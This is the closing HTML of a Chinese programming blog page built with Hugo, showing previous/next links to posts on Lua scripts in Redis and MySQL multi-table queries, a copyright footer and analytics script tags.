			<p class="pager__title">lua脚本在redis的实战案例</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/eb76d31cc2c29be7c1c81e1f1aadb981/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">[MySQL][复核查询][多表查询][自连接][自查询]详细讲解</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>